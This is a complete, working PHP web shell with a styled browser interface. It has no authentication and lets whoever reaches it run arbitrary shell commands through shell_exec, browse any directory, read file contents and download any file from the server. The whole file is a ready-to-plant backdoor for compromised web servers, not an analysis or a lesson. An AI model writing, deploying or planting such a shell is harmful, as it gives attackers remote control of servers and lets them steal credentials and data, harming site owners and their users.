<?php
set_time_limit(0);

// File download ?download=/path/to/file
if (isset($_GET['download'])) {
    $file = $_GET['download'];

    if (is_file($file) && is_readable($file)) {
        $basename = basename($file);
        $size     = @filesize($file);

        header('Content-Type: application/octet-stream');
        if ($size !== false) {
            header('Content-Length: ' . $size);
        }
        header('Content-Disposition: attachment; filename="' . $basename . '"');
        header('X-Content-Type-Options: nosniff');

        readfile($file);
    } else {
        header('HTTP/1.1 404 Not Found');
        echo 'File not found';
    }
    exit;
}

// AJAX handling
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = isset($_POST['action']) ? $_POST['action'] : '';

    // Command execution
    if ($action === 'exec') {
        header('Content-Type: text/plain; charset=UTF-8');

        $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : '';
        $cwd = isset($_POST['cwd']) ? $_POST['cwd'] : getcwd();

        if ($cmd !== '') {
            if ($cwd && @chdir($cwd) === false) {
                echo "Error: cannot change directory to {$cwd}\n\n";
            }

            $output = shell_exec($cmd . ' 2>&1');
            if ($output !== null && $output !== '') {
                echo $output;
            } else {
                echo "Command executed (no output).\n";
            }
        } else {
            echo "Error: empty command.\n";
        }
        exit;
    }

    // Directory listing
    if ($action === 'list') {
        header('Content-Type: application/json; charset=UTF-8');

        $path = isset($_POST['path']) ? $_POST['path'] : getcwd();

        if (!is_dir($path)) {
            echo json_encode(array('error' => 'Invalid directory'));
            exit;
        }

        $items = scandir($path);
        if ($items === false) {
            echo json_encode(array('error' => 'Unable to read directory'));
            exit;
        }

        $files = array();
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') {
                continue;
            }

            $fullPath = rtrim($path, '/').'/'.$item;
            $files[] = array(
                'name' => $item,
                'path' => $fullPath,
                'type' => is_dir($fullPath) ? 'dir' : 'file'
            );
        }

        echo json_encode(array('files' => $files));
        exit;
    }

    // File preview
    if ($action === 'preview') {
        header('Content-Type: text/plain; charset=UTF-8');

        $path = isset($_POST['path']) ? $_POST['path'] : '';

        if ($path === '' || !is_file($path) || !is_readable($path)) {
            echo "Error: file not found or not readable.";
            exit;
        }

        $maxBytes = 200 * 1024; // 200 KB limit
        $size     = @filesize($path);

        if ($size !== false && $size > $maxBytes) {
            $content = @file_get_contents($path, false, null, 0, $maxBytes);
            if ($content === false) {
                echo "Error: unable to read file.";
            } else {
                echo $content;
                echo "\n\n[... preview truncated, file size > 200KB ...]";
            }
        } else {
            $content = @file_get_contents($path);
            if ($content === false) {
                echo "Error: unable to read file.";
            } else {
                echo $content;
            }
        }

        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Shell</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff88;
            padding: 20px;
            min-height: 100vh;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        .card {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
        }

        .card h2 {
            color: #00ff88;
            margin-bottom: 15px;
            font-size: 1.2em;
        }

        input[type="text"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #333;
            background: #0a0a0a;
            color: #00ff88;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }

        input[type="text"]:focus {
            outline: none;
            border-color: #00ff88;
        }

        .output {
            background: #000;
            color: #00ff88;
            padding: 15px;
            border-radius: 4px;
            border: 1px solid #333;
            margin-top: 15px;
            max-height: 500px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
            font-size: 13px;
            line-height: 1.4;
        }

        .cwd-display {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 4px;
            padding: 15px;
            margin-bottom: 20px;
            color: #00ff88;
            font-size: 14px;
        }

        .cwd-path {
            overflow-x: auto;
            white-space: nowrap;
        }

        .file-browser {
            max-height: 500px;
            overflow-y: auto;
        }

        .file-item {
            padding: 10px;
            border-bottom: 1px solid #333;
            cursor: pointer;
            transition: background 0.2s ease;
            color: #00ff88;
        }

        .file-item:hover {
            background: #252525;
        }

        .file-item.dir {
            color: #66bbff;
        }

        .file-item.file {
            color: #00ff88;
        }

        .file-item.back {
            color: #ffaa00;
            font-style: italic;
        }

        .file-item.back span.label {
            opacity: 0.8;
        }

        .download-link {
            color: #ffaa00;
            text-decoration: none;
            margin-left: 10px;
            font-size: 11px;
        }

        .download-link:hover {
            text-decoration: underline;
        }

        .preview-link {
            color: #66bbff;
            text-decoration: none;
            margin-left: 10px;
            font-size: 11px;
        }

        .preview-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h2>Terminal</h2>
            <input type="text" id="cmd-input" placeholder="Enter your command">
            <div class="output" id="cmd-output"></div>
        </div>

        <div class="cwd-display">
            <div class="cwd-path">
                <strong>CWD:</strong>
                <span id="cwd-display"><?php echo getcwd(); ?></span>
            </div>
        </div>

        <div class="card">
            <h2>File Manager</h2>
            <div class="file-browser" id="file-list">Loading...</div>
        </div>

        <div class="card">
            <h2>File Preview</h2>
            <div class="output" id="file-preview">No file selected...</div>
        </div>
    </div>

    <script>
        let currentCwd = '<?php echo addslashes(getcwd()); ?>';

        function updateCwdDisplay() {
            document.getElementById('cwd-display').textContent = currentCwd;
        }

        function parentPath(path) {
            let segments = path.split('/');
            segments = segments.filter(function (s) { return s.length > 0; });
            if (segments.length === 0) {
                return '/';
            }
            segments.pop();
            if (segments.length === 0) {
                return '/';
            }
            return '/' + segments.join('/');
        }

        function goBack() {
            if (currentCwd === '/' || currentCwd === '') {
                return;
            }
            currentCwd = parentPath(currentCwd);
            currentCwd = currentCwd.replace(/\/+/g, '/');
            updateCwdDisplay();
            browseFiles();
        }

        function executeCommand() {
            const input = document.getElementById('cmd-input');
            const cmd = input.value;
            const output = document.getElementById('cmd-output');

            if (!cmd.trim()) {
                output.textContent = 'Error: empty command';
                return;
            }

            if (cmd.trim().indexOf('cd ') === 0) {
                const newPath = cmd.trim().substring(3).trim();
                if (newPath === '..') {
                    goBack();
                    input.value = '';
                    output.textContent = '$ ' + cmd + '\n\nDirectory changed: ' + currentCwd;
                    return;
                } else if (newPath.charAt(0) === '/') {
                    currentCwd = newPath || '/';
                    currentCwd = currentCwd.replace(/\/+/g, '/');
                    updateCwdDisplay();
                    output.textContent = '$ ' + cmd + '\n\nDirectory changed: ' + currentCwd;
                    browseFiles();
                } else {
                    currentCwd = (currentCwd + '/' + newPath).replace(/\/+/g, '/');
                    currentCwd = currentCwd.replace(/\/+/g, '/');
                    updateCwdDisplay();
                    output.textContent = '$ ' + cmd + '\n\nDirectory changed: ' + currentCwd;
                    browseFiles();
                }
                input.value = '';
                return;
            }

            const xhr = new XMLHttpRequest();
            xhr.open('POST', '', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4) {
                    const res = (xhr.status === 200) ? xhr.responseText : 'HTTP error ' + xhr.status;
                    output.textContent = '$ ' + cmd + '\n\n' + res;
                }
            };
            xhr.send(
                'action=exec' +
                '&cmd=' + encodeURIComponent(cmd) +
                '&cwd=' + encodeURIComponent(currentCwd)
            );

            input.value = '';
        }

        function browseFiles(path) {
            const targetPath = path || currentCwd;
            const fileList = document.getElementById('file-list');

            const xhr = new XMLHttpRequest();
            xhr.open('POST', '', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4) {
                    let html = '';

                    // Always show "back" entry when not at root
                    if (currentCwd !== '/' && currentCwd !== '') {
                        html += '<div class="file-item back" onclick="handleBackClick()">' +
                                '<span class="label">[..] back</span>' +
                                '</div>';
                    }

                    if (xhr.status !== 200) {
                        html += '<div style="color: #ff4444; padding: 20px;">HTTP error ' + xhr.status + '</div>';
                        fileList.innerHTML = html;
                        return;
                    }

                    let result;
                    try {
                        result = JSON.parse(xhr.responseText);
                    } catch (e) {
                        html += '<div style="color: #ff4444; padding: 20px;">Invalid JSON response</div>';
                        fileList.innerHTML = html;
                        return;
                    }

                    if (result.error) {
                        html += '<div style="color: #ff4444; padding: 20px;">' + result.error + '</div>';
                        fileList.innerHTML = html;
                        return;
                    }

                    for (let i = 0; i < result.files.length; i++) {
                        const file = result.files[i];
                        const isDir = file.type === 'dir';
                        const className = isDir ? 'dir' : 'file';
                        const prefix = isDir ? '[DIR] ' : '[FILE] ';
                        const safePath = file.path.replace(/'/g, "\\'");
                        const handler = isDir
                            ? 'handleDirClick(\'' + safePath + '\')'
                            : 'handleFileClick(\'' + safePath + '\')';

                        if (isDir) {
                            html += '<div class="file-item ' + className + '" onclick="' + handler + '">' +
                                prefix + file.name +
                                '</div>';
                        } else {
                            html += '<div class="file-item ' + className + '" onclick="' + handler + '">' +
                                prefix + file.name +
                                ' <a href="#" class="preview-link" onclick="event.stopPropagation(); previewFile(\'' +
                                safePath + '\'); return false;">VIEW</a>' +
                                ' <a href="?download=' + encodeURIComponent(file.path) +
                                '" class="download-link" onclick="event.stopPropagation()">DL</a>' +
                                '</div>';
                        }
                    }
                    fileList.innerHTML = html;
                }
            };
            xhr.send(
                'action=list' +
                '&path=' + encodeURIComponent(targetPath)
            );
        }

        function previewFile(path) {
            const preview = document.getElementById('file-preview');
            preview.textContent = 'Preview of: ' + path + ' ...';

            const xhr = new XMLHttpRequest();
            xhr.open('POST', '', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                        preview.textContent = 'Preview of: ' + path + '\n\n' + xhr.responseText;
                    } else {
                        preview.textContent = 'Preview error (HTTP ' + xhr.status + ')';
                    }
                }
            };
            xhr.send('action=preview&path=' + encodeURIComponent(path));
        }

        function handleBackClick() {
            goBack();
        }

        function handleDirClick(path) {
            currentCwd = path || '/';
            currentCwd = currentCwd.replace(/\/+/g, '/');
            updateCwdDisplay();
            browseFiles(path);
        }

        function handleFileClick(path) {
            const input = document.getElementById('cmd-input');
            input.value = 'cat ' + path;
            input.focus();
        }

        document.getElementById('cmd-input').addEventListener('keypress', function (e) {
            if (e.key === 'Enter') {
                executeCommand();
            }
        });

        updateCwdDisplay();
        browseFiles();
    </script>
</body>
</html>
